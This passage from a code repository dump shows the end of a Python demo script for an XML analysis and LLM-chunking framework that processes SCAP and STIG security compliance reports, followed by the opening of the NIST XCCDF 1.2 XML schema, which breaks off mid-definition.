        chunks = orchestrator.chunk_document(
            str(large_xml_path),
            analysis_result,
            strategy=strategy,
            config=config
        )
        
        print(f"✂️  Created {len(chunks)} chunks")
        
        # Show first 2 chunks
        for i, chunk in enumerate(chunks[:2]):
            print(f"\n   Chunk {i+1}:")
            print(f"   - ID: {chunk.chunk_id}")
            print(f"   - Path: {chunk.element_path}")
            print(f"   - Tokens: ~{chunk.token_estimate}")
            print(f"   - Elements: {', '.join(chunk.elements_included[:3])}")
            print(f"   - Preview: {chunk.content[:80]}...")

def demonstrate_ai_use_cases():
    """Show how the analysis can be used for AI projects"""
    print_separator("AI USE CASE DEMONSTRATION")
    
    # Create a sample SCAP document
    scap_path = Path("sample_data/security_scan.xml")
    scap_content = """<?xml version="1.0" encoding="UTF-8"?>
<arf:asset-report-collection xmlns:arf="http://scap.nist.gov/schema/asset-reporting-format/1.1">
    <core:relationships xmlns:core="http://scap.nist.gov/schema/reporting-core/1.1">
        <core:relationship type="isAbout" subject="scan1">
            <core:ref>server-01</core:ref>
        </core:relationship>
    </core:relationships>
    <arf:reports>
        <arf:report id="scan1">
            <content>
                <rule-result idref="xccdf_rule_1" severity="high">
                    <result>fail</result>
                    <message>SSH root login is enabled</message>
                </rule-result>
                <rule-result idref="xccdf_rule_2" severity="medium">
                    <result>pass</result>
                    <message>Firewall is properly configured</message>
                </rule-result>
                <rule-result idref="xccdf_rule_3" severity="high">
                    <result>fail</result>
                    <message>System updates are not configured</message>
                </rule-result>
            </content>
        </arf:report>
    </arf:reports>
</arf:asset-report-collection>"""
    
    scap_path.write_text(scap_content)
    
    # Analyze the document
    analyzer = XMLDocumentAnalyzer()
    result = analyzer.analyze_document(str(scap_path))
    
    print("\n🎯 AI Project Planning Assistant")
    print("-" * 40)
    
    if result.get("analysis"):
        analysis = result["analysis"]
        doc_type = result["document_type"].type_name
        
        print(f"\n📄 Document Type: {doc_type}")
        print(f"\n🤖 Recommended AI Applications:")
        
        for i, use_case in enumerate(analysis.ai_use_cases, 1):
            print(f"\n{i}. {use_case}")
            
            # Provide specific guidance for each use case
            if "compliance" in use_case.lower():
                print("   📋 Implementation approach:")
                print("   - Extract rule violations and patterns")
                print("   - Train classifier on historical compliance data")
                print("   - Build automated remediation suggestions")
                
            elif "risk" in use_case.lower():
                print("   📋 Implementation approach:")
                print("   - Aggregate severity scores and failure patterns")
                print("   - Develop risk scoring model")
                print("   - Create predictive analytics dashboard")
                
            elif "recommendation" in use_case.lower():
                print("   📋 Implementation approach:")
                print("   - Map failures to remediation steps")
                print("   - Use NLP to generate human-readable fixes")
                print("   - Prioritize based on risk and effort")
        
        print(f"\n📊 Data Availability:")
        for data_type, count in analysis.data_inventory.items():
            print(f"   - {data_type}: {count}")
        
        print(f"\n✨ Quick Start Code:")
        print("""
# Load and process the analyzed data
from pathlib import Path
import json

# Load the analysis results
with open('security_scan_enhanced_analysis.json') as f:
    analysis = json.load(f)

# Extract structured data for ML
structured_data = analysis['specialized_analysis']['analysis']['structured_data']

# Example: Build a compliance classifier
failed_rules = [rule for rule in structured_data.get('scan_results', []) 
                if rule.get('result') == 'fail']

# Train your model on the extracted data
# model.train(failed_rules, remediation_labels)
""")

def demonstrate_integration_workflow():
    """Show a complete workflow from analysis to LLM preparation"""
    print_separator("COMPLETE INTEGRATION WORKFLOW")
    
    print("\n🔄 Workflow: XML → Analysis → Chunks → LLM-Ready")
    print("-" * 40)
    
    # Use the existing STIG file
    stig_path = Path("sample_data/node2.example.com-STIG-20250710162433.xml")
    
    if not stig_path.exists():
        print("❌ STIG sample file not found. Using a smaller example.")
        # Create a simple example
        stig_path = Path("sample_data/mini_stig.xml")
        stig_path.write_text("""<?xml version="1.0"?>
<Benchmark id="xccdf_benchmark">
    <Group id="V-1234">
        <title>Security Configuration</title>
        <Rule id="rule_1234" severity="high">
            <title>Ensure secure settings</title>
            <description>This rule checks for secure configurations</description>
            <check system="http://oval.mitre.org/XMLSchema/oval-definitions-5">
                <check-content-ref href="#oval:check:1234"/>
            </check>
        </Rule>
    </Group>
</Benchmark>""")
    
    print(f"\n1️⃣ Step 1: Analyze Document")
    analyzer = XMLDocumentAnalyzer()
    analysis = analyzer.analyze_document(str(stig_path))
    
    print(f"   ✅ Document type: {analysis['document_type'].type_name}")
    print(f"   ✅ Handler confidence: {analysis['confidence']:.1%}")
    
    print(f"\n2️⃣ Step 2: Apply Intelligent Chunking")
    orchestrator = ChunkingOrchestrator()
    chunks = orchestrator.chunk_document(
        str(stig_path),
        analysis,
        strategy='auto'
    )
    
    print(f"   ✅ Created {len(chunks)} chunks")
    print(f"   ✅ Strategy selected: {orchestrator._select_strategy(analysis)}")
    
    print(f"\n3️⃣ Step 3: Prepare for LLM Processing")
    
    # Simulate LLM prompts for first chunk
    if chunks:
        chunk = chunks[0]
        prompt = f"""You are analyzing a {analysis['document_type'].type_name} document.

Document Context:
- Type: {analysis['document_type'].type_name}
- Total chunks: {len(chunks)}
- Current chunk: 1 of {len(chunks)}

Chunk Content:
{chunk.content[:500]}...

Based on this security compliance data, please:
1. Identify any high-severity findings
2. Suggest remediation steps
3. Assess overall security posture
"""
        
        print("   📝 Generated LLM Prompt Preview:")
        print("   " + "-" * 35)
        for line in prompt.split('\n')[:10]:
            print(f"   {line}")
        print("   ...")
    
    print(f"\n4️⃣ Step 4: Process Results")
    print("   ✅ Ready for LLM processing")
    print("   ✅ Chunks maintain context")
    print("   ✅ Specialized extraction completed")

def main():
    """Run all demonstrations"""
    print("\n🚀 XML ANALYSIS FRAMEWORK DEMONSTRATION")
    print("=====================================")
    
    # Create sample directory
    Path("sample_data").mkdir(exist_ok=True)
    
    try:
        # Run demonstrations
        demonstrate_specialized_handlers()
        demonstrate_chunking_strategies()
        demonstrate_ai_use_cases()
        demonstrate_integration_workflow()
        
        print_separator("DEMONSTRATION COMPLETE")
        print("\n✅ All demonstrations completed successfully!")
        print("\n📚 Next Steps:")
        print("1. Try with your own XML files: python analyze_enhanced.py your_file.xml")
        print("2. Create custom handlers for your specific XML formats")
        print("3. Integrate with your LLM pipeline for automated processing")
        print("4. Build AI applications using the extracted structured data")
        
    except Exception as e:
        print(f"\n❌ Error during demonstration: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
</file>

<file path="sample_data/test_files/medium/scap/xccdf_1.2_bundle_1_xccdf_1.2.xsd">
<?xml version="1.0" encoding="UTF-8"?>
<xsd:schema xmlns:xsd="http://www.w3.org/2001/XMLSchema"
    xmlns:cdf="http://checklists.nist.gov/xccdf/1.2" xmlns:cpe2="http://cpe.mitre.org/language/2.0"
    targetNamespace="http://checklists.nist.gov/xccdf/1.2" elementFormDefault="qualified"
    attributeFormDefault="unqualified" version="1.2.1">

    <xsd:annotation>
        <xsd:documentation xml:lang="en"> This schema defines the Extensible Configuration Checklist
            Description Format (XCCDF), a data format for defining security benchmarks and
            checklists, and for recording the results of applying such benchmarks. For more
            information, consult the specification document, NIST Interagency Report 7275 Revision
            4, "Specification for the Extensible Configuration Checklist Description Format Version
            1.2". This schema was developed by Neal Ziring, with ideas and assistance from David
            Waltermire. The following helpful individuals also contributed ideas to the definition
            of this schema: David Proulx, Andrew Buttner, Ryan Wilson, Matthew Kerr, and Stephen
            Quinn. Ian Crawford found numerous discrepancies between this schema and the spec
            document. Peter Mell and his colleagues also made many suggestions. </xsd:documentation>
        <xsd:appinfo>
            <schema>XCCDF Language</schema>
            <author>Neal Ziring</author>
            <version>1.2</version>
            <date>2012-02-23</date>
        </xsd:appinfo>
    </xsd:annotation>

    <!-- Import base XML namespace -->
    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" schemaLocation="xml.xsd">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Import the XML namespace because this schema uses the
                @xml:lang and @xml:base attributes. </xsd:documentation>
        </xsd:annotation>
    </xsd:import>

    <!-- Import CPE 2.3 Language namespace -->
    <xsd:import namespace="http://cpe.mitre.org/language/2.0" schemaLocation="cpe-language_2.3.xsd">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Import the Common Platform Enumeration language
                schema, which can be used for defining compound CPE tests for complex IT platforms
                in the &lt;xccdf:Benchmark&gt;. For more info see NIST IRs 7695-7698, the
                specification documents for CPE version 2.3. </xsd:documentation>
        </xsd:annotation>
    </xsd:import>

    <!-- ************************************************************** -->
    <!-- *****************  Benchmark Element  ************************ -->
    <!-- ************************************************************** -->
    <xsd:element name="Benchmark">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> This is the root element of the XCCDF document; it
                must appear exactly once. It encloses the entire benchmark, and contains both
                descriptive information and structural information. Note that the order of
                &lt;xccdf:Group&gt; and &lt;xccdf:Rule&gt; child elements may matter for the
                appearance of a generated document. &lt;xccdf:Group&gt; and &lt;xccdf:Rule&gt;
                children may be freely intermingled, but they must appear after any
                &lt;xccdf:Value&gt; children. All the other children must appear in the order
                shown.</xsd:documentation>
        </xsd:annotation>
        <xsd:complexType>
            <xsd:sequence>
                <xsd:element ref="cdf:status" minOccurs="1" maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Status of the &lt;xccdf:Benchmark&gt;
                            indicating its level of maturity or consensus. If more than one
                            &lt;xccdf:status&gt; element appears, the element's @date attribute
                            should be included.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="dc-status" minOccurs="0" maxOccurs="unbounded"
                    type="cdf:dc-statusType">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Holds additional status information using
                            the Dublin Core format.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="title" type="cdf:textType" minOccurs="0" maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Title of the &lt;xccdf:Benchmark&gt;; an
                            &lt;xccdf:Benchmark&gt; should have an
                            &lt;xccdf:title&gt;.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="description" type="cdf:htmlTextWithSubType" minOccurs="0"
                    maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Text that describes the
                            &lt;xccdf:Benchmark&gt;; an &lt;xccdf:Benchmark&gt; should have an
                            &lt;xccdf:description&gt;.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="notice" type="cdf:noticeType" minOccurs="0" maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Legal notices (licensing information, terms
                            of use, etc.), copyright statements, warnings, and other advisory
                            notices about this &lt;xccdf:Benchmark&gt; and its
                            use.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="front-matter" type="cdf:htmlTextWithSubType" minOccurs="0"
                    maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Introductory matter for the beginning of
                            the &lt;xccdf:Benchmark&gt; document; intended for use during Document
                            Generation.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="rear-matter" type="cdf:htmlTextWithSubType" minOccurs="0"
                    maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Concluding material for the end of the
                            &lt;xccdf:Benchmark&gt; document; intended for use during Document
                            Generation.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="reference" type="cdf:referenceType" minOccurs="0"
                    maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Supporting references for the
                            &lt;xccdf:Benchmark&gt; document.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="plain-text" type="cdf:plainTextType" minOccurs="0"
                    maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Definitions for reusable text blocks, each
                            with a unique identifier.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element ref="cpe2:platform-specification" minOccurs="0" maxOccurs="1">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">A list of identifiers for complex platform
                            definitions, written in CPE applicability language format. Authors may
                            define complex platforms within this element, and then use their locally
                            unique identifiers anywhere in the &lt;xccdf:Benchmark&gt; element in
                            place of a CPE name.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="platform" type="cdf:CPE2idrefType" minOccurs="0"
                    maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Applicable platforms for this
                            &lt;xccdf:Benchmark&gt;. Authors should use the element to identify the
                            systems or products to which the &lt;xccdf:Benchmark&gt;
                            applies.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="version" type="cdf:versionType" minOccurs="1" maxOccurs="1">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Version number of the
                            &lt;xccdf:Benchmark&gt;.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="metadata" type="cdf:metadataType" minOccurs="0"
                    maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">XML metadata for the
                            &lt;xccdf:Benchmark&gt;. Metadata allows many additional pieces of
                            information, including authorship, publisher, support, and other similar
                            details, to be embedded in an
                            &lt;xccdf:Benchmark&gt;.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element ref="cdf:model" minOccurs="0" maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">URIs of suggested scoring models to be used
                            when computing a score for this &lt;xccdf:Benchmark&gt;. A suggested
                            list of scoring models and their URIs is provided in the XCCDF
                            specification.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element ref="cdf:Profile" minOccurs="0" maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">&lt;xccdf:Profile&gt; elements that
                            reference and customize sets of items in the
                            &lt;xccdf:Benchmark&gt;.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element ref="cdf:Value" minOccurs="0" maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Parameter &lt;xccdf:Value&gt; elements that
                            support &lt;xccdf:Rule&gt; elements and descriptions in the
                            &lt;xccdf:Benchmark&gt;. </xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:choice minOccurs="0" maxOccurs="unbounded">
                    <xsd:element ref="cdf:Group">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">&lt;xccdf:Group&gt; elements that
                                comprise the &lt;xccdf:Benchmark&gt;; each may contain additional
                                &lt;xccdf:Value&gt;, &lt;xccdf:Rule&gt;, and other
                                &lt;xccdf:Group&gt; elements. </xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                    <xsd:element ref="cdf:Rule">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">&lt;xccdf:Rule&gt; elements that
                                comprise the &lt;xccdf:Benchmark&gt;.</xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                </xsd:choice>
                <xsd:element ref="cdf:TestResult" minOccurs="0" maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">&lt;xccdf:Benchmark&gt; test result records
                            (one per &lt;xccdf:Benchmark&gt; run).</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="signature" type="cdf:signatureType" minOccurs="0" maxOccurs="1">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">A digital signature asserting authorship
                            and allowing verification of the integrity of the
                            &lt;xccdf:Benchmark&gt;.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
            </xsd:sequence>
            <xsd:attribute name="id" type="cdf:benchmarkIdType" use="required">
                <xsd:annotation>
                    <xsd:documentation>Unique &lt;xccdf:Benchmark&gt;
                        identifier.</xsd:documentation>
                </xsd:annotation>
            </xsd:attribute>
            <xsd:attribute name="Id" type="xsd:ID" use="optional">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">An identifier used for referencing elements
                        included in an XML signature.</xsd:documentation>
                </xsd:annotation>
            </xsd:attribute>
            <xsd:attribute name="resolved" type="xsd:boolean" default="false" use="optional">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">True if &lt;xccdf:Benchmark&gt; has already
                        undergone the resolution process.</xsd:documentation>
                </xsd:annotation>
            </xsd:attribute>
            <xsd:attribute name="style" type="xsd:string" use="optional">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Name of an &lt;xccdf:Benchmark&gt; authoring
                        style or set of conventions or constraints to which this
                        &lt;xccdf:Benchmark&gt; conforms (e.g., “SCAP 1.2”).</xsd:documentation>
                </xsd:annotation>
            </xsd:attribute>
            <xsd:attribute name="style-href" type="xsd:anyURI" use="optional">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">URL of a supplementary stylesheet or schema
                        extension that can be used to verify conformance to the named
                        style.</xsd:documentation>
                </xsd:annotation>
            </xsd:attribute>
            <xsd:attribute ref="xml:lang"/>
        </xsd:complexType>

        <xsd:unique name="noticeIdUnique">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> Legal notices must have unique id values.
                </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath="cdf:notice"/>
            <xsd:field xpath="@id"/>
        </xsd:unique>

        <xsd:key name="itemIdKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> Items must have unique id values, and also they
                    must not collide. </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath=".//cdf:Value|.//cdf:Group|.//cdf:Rule|./cdf:plain-text"/>
            <xsd:field xpath="@id"/>
        </xsd:key>

        <xsd:key name="modelSystemKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> Model system attributes must be unique.
                </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath="./cdf:model"/>
            <xsd:field xpath="@system"/>
        </xsd:key>

        <xsd:key name="valueIdKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> &lt;xccdf:Value&gt; item ids are special keys,
                    need this for the valueIdKeyRef and valueExtIdKeyRef keyrefs below.
                </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath=".//cdf:Value"/>
            <xsd:field xpath="@id"/>
        </xsd:key>

        <xsd:key name="groupIdKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> &lt;xccdf:Group&gt; item ids are special keys,
                    need this for the groupIdKeyRef keyref below. </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath=".//cdf:Group"/>
            <xsd:field xpath="@id"/>
        </xsd:key>

        <xsd:key name="ruleIdKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> &lt;xccdf:Rule&gt; items have a unique key, we
                    need this for the ruleIdKeyRef keyref below. (&lt;xccdf:Rule&gt; key refs are
                    used by &lt;xccdf:rule-result&gt; elements.) </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath=".//cdf:Rule"/>
            <xsd:field xpath="@id"/>
        </xsd:key>

        <xsd:key name="selectableItemIdKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> &lt;xccdf:Group&gt; and &lt;xccdf:Rule&gt; item
                    ids are special keys, we need this for the requiresIdKeyRef keyref below.
                </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath=".//cdf:Group | .//cdf:Rule"/>
            <xsd:field xpath="@id"/>
        </xsd:key>

        <xsd:key name="plainTextValueIdKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> &lt;xccdf:plain-text&gt; objects and
                    &lt;xccdf:Value&gt; objects each have an id, and they must be unique and not
                    overlap. </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath="./cdf:plain-text | .//cdf:Value"/>
            <xsd:field xpath="@id"/>
        </xsd:key>

        <xsd:key name="profileIdKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> &lt;xccdf:Profile&gt; objects have a unique id, it
                    is used for extension, too. </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath="./cdf:Profile"/>
            <xsd:field xpath="@id"/>
        </xsd:key>

        <xsd:keyref name="valueExtIdKeyRef" refer="cdf:valueIdKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> An @extends attribute on &lt;xccdf:Value&gt;
                    object must reference an existing &lt;xccdf:Value&gt;. </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath=".//cdf:Value"/>
            <xsd:field xpath="@extends"/>
        </xsd:keyref>

        <xsd:keyref name="groupExtIdKeyRef" refer="cdf:groupIdKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> An @extends attribute on &lt;xccdf:Group&gt;
                    objects must reference an existing &lt;xccdf:Group&gt;. NOTE:
                    &lt;xccdf:Group&gt; extension is now deprecated and should be avoided.
                </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath=".//cdf:Group"/>
            <xsd:field xpath="@extends"/>
        </xsd:keyref>

        <xsd:keyref name="ruleExtIdKeyRef" refer="cdf:ruleIdKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> An @extends attribute on an &lt;xccdf:Rule&gt;
                    object must reference an existing &lt;xccdf:Rule&gt;. </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath=".//cdf:Rule"/>
            <xsd:field xpath="@extends"/>
        </xsd:keyref>

        <xsd:keyref name="profileExtIdKeyRef" refer="cdf:profileIdKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> An @extends attribute on &lt;xccdf:Profile&gt;
                    object must reference an existing &lt;xccdf:Profile&gt;. </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath="./cdf:Profile"/>
            <xsd:field xpath="@extends"/>
        </xsd:keyref>

        <xsd:keyref name="valueIdKeyRef" refer="cdf:valueIdKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> &lt;xccdf:check-export&gt; elements must reference
                    existing &lt;xccdf:Value&gt; elements. </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath=".//cdf:check/cdf:check-export"/>
            <xsd:field xpath="@value-id"/>
        </xsd:keyref>

        <xsd:keyref name="subValueKeyRef" refer="cdf:plainTextValueIdKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> &lt;xccdf:sub&gt; elements must reference existing
                    &lt;xccdf:Value&gt; or &lt;xccdf:plain-text&gt; ids. </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath=".//cdf:sub"/>
            <xsd:field xpath="@idref"/>
        </xsd:keyref>

        <xsd:keyref name="ruleIdKeyRef" refer="cdf:ruleIdKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> The &lt;xccdf:rule-result&gt; element @idref must
                    refer to an existing &lt;xccdf:Rule&gt;. </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath="./cdf:TestResult/cdf:rule-result"/>
            <xsd:field xpath="@idref"/>
        </xsd:keyref>

    </xsd:element>

    <xsd:complexType name="noticeType" mixed="true">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Data type for an &lt;xccdf:notice&gt; element.
                &lt;xccdf:notice&gt; elements are used to include legal notices (licensing
                information, terms of use, etc.), copyright statements, warnings, and other advisory
                notices about this &lt;xccdf:Benchmark&gt; and its use. This information may be
                expressed using XHTML or may be a simply text expression. Each &lt;xccdf:notice&gt;
                element must have a unique identifier. </xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:any namespace="http://www.w3.org/1999/xhtml" minOccurs="0" maxOccurs="unbounded"
                processContents="skip"/>
        </xsd:sequence>
        <xsd:attribute name="id" type="xsd:NCName">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The unique identifier for this
                    &lt;xccdf:notice&gt;.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute ref="xml:base"/>
        <xsd:attribute ref="xml:lang"/>
    </xsd:complexType>

    <xsd:complexType name="dc-statusType">
        <xsd:annotation>
            <xsd:documentation>Data type element for the &lt;xccdf:dc-status&gt; element, which
                holds status information about its parent element using the Dublin Core format,
                expressed as elements of the DCMI Simple DC Element specification.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:any namespace="http://purl.org/dc/elements/1.1/" minOccurs="1"
                maxOccurs="unbounded"/>
        </xsd:sequence>
    </xsd:complexType>

    <xsd:complexType name="plainTextType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">The data type for an &lt;xccdf:plain-text&gt; element,
                which is a reusable text block for reference by the &lt;xccdf:sub&gt; element. This
                allows text to be defined once and then reused multiple times. Each
                &lt;xccdf:plain-text&gt; element mush have a unique id.</xsd:documentation>
        </xsd:annotation>
        <xsd:simpleContent>
            <xsd:extension base="xsd:string">
                <xsd:attribute name="id" type="xsd:NCName" use="required">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">The unique identifier for this
                            &lt;xccdf:plain-text&gt; element.</xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:simpleContent>
    </xsd:complexType>

    <xsd:complexType name="referenceType" mixed="true">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> This element provides supplementary descriptive text
                for a XCCDF elements. When used, it has either a simple string value or a value
                consisting of simple Dublin Core elements. If a bare string appears, then it is
                taken to be the string content for a Dublin Core title element. Multiple
                &lt;xccdf:reference&gt; elements may appear; a document generation processing tool
                may concatenate them, or put them into a reference list, and may choose to number
                them. </xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:any namespace="http://purl.org/dc/elements/1.1/" processContents="lax"
                minOccurs="0" maxOccurs="unbounded"/>
        </xsd:sequence>
        <xsd:attribute name="href" type="xsd:anyURI">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">A URL pointing to the referenced
                    resource.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="override" type="xsd:boolean">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Used to manage inheritance
                    processing.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="signatureType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The type of an &lt;XMLDSig:signature&gt; element,
                which holds an enveloped digital signature asserting authorship and allowing
                verification of the integrity of associated data (e.g., its parent element, other
                documents, portions of other documents). </xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:any namespace="http://www.w3.org/2000/09/xmldsig#" processContents="skip"
                minOccurs="1" maxOccurs="1"/>
        </xsd:sequence>
    </xsd:complexType>

    <xsd:complexType name="metadataType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type that supports inclusion of metadata about a
                document or element. This is particularly useful for facilitating the discovery and
                retrieval of XCCDF checklists from public repositories. When used, the contents of
                the &lt;xccdf:metadata&gt; element are expressed in XML. The &lt;xccdf:Benchmark&gt;
                element's metadata should contain information formatted using the Dublin Core
                Metadata Initiative (DCMI) Simple DC Element specification, as described in [DCES]
                and [DCXML]. Benchmark consumers should be prepared to process Dublin Core metadata
                in the &lt;xccdf:metadata&gt; element. Other metadata schemes, including ad-hoc
                elements, are also allowed, both in the &lt;xccdf:Benchmark&gt; and in other
                elements.</xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:any minOccurs="1" maxOccurs="unbounded" processContents="lax" namespace="##other"/>
        </xsd:sequence>
    </xsd:complexType>

    <!-- ************************************************************** -->
    <!-- *************  Global elements and types  ******************** -->
    <!-- ************************************************************** -->
    <xsd:element name="status">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The acceptance status of an element with an optional
                date attribute, which signifies the date of the status change. If an element does
                not have its own &lt;xccdf:status&gt; element, its status is that of its parent
                element. If there is more than one &lt;xccdf:status&gt; for a single element, then
                every instance of the &lt;xccdf:status&gt; element must have a @date attribute, and
                the &lt;xccdf:status&gt; element with the latest date is considered the current
                status. </xsd:documentation>
        </xsd:annotation>
        <xsd:complexType>
            <xsd:simpleContent>
                <xsd:extension base="cdf:statusType">
                    <xsd:attribute name="date" type="xsd:date" use="optional">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">The date the parent element achieved
                                the indicated status.</xsd:documentation>
                        </xsd:annotation>
                    </xsd:attribute>
                </xsd:extension>
            </xsd:simpleContent>
        </xsd:complexType>
    </xsd:element>

    <xsd:element name="model">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> A suggested scoring model for an
                &lt;xccdf:Benchmark&gt;, also encapsulating any parameters needed by the model.
                Every model is designated with a URI, which appears here as the system attribute.
                See the XCCDF specification for a list of standard scoring models and their
                associated URIs. Vendors may define their own scoring models and provide additional
                URIs to designate them. Some models may need additional parameters; to support such
                a model, zero or more &lt;xccdf:param&gt; elements may appear as children of the
                &lt;xccdf:model&gt; element.</xsd:documentation>
        </xsd:annotation>
        <xsd:complexType>
            <xsd:sequence>
                <xsd:element name="param" type="cdf:paramType" minOccurs="0" maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Parameters provided as input to the
                            designated scoring model.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
            </xsd:sequence>
            <xsd:attribute name="system" type="xsd:anyURI" use="required">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A URI designating a scoring
                        model.</xsd:documentation>
                </xsd:annotation>
            </xsd:attribute>
        </xsd:complexType>

        <xsd:key name="paramNameKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> Parameter names must be unique.
                </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath="./cdf:param"/>
            <xsd:field xpath="@name"/>
        </xsd:key>
    </xsd:element>

    <xsd:complexType name="paramType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Type for a parameter used in the &lt;xccdf:model&gt;
                element, which records scoring model information. The contents of this type
                represent a name-value pair, where the name is recorded in the @name attribute and
                the value appears in the element body. &lt;xccdf:param&gt; elements with equal
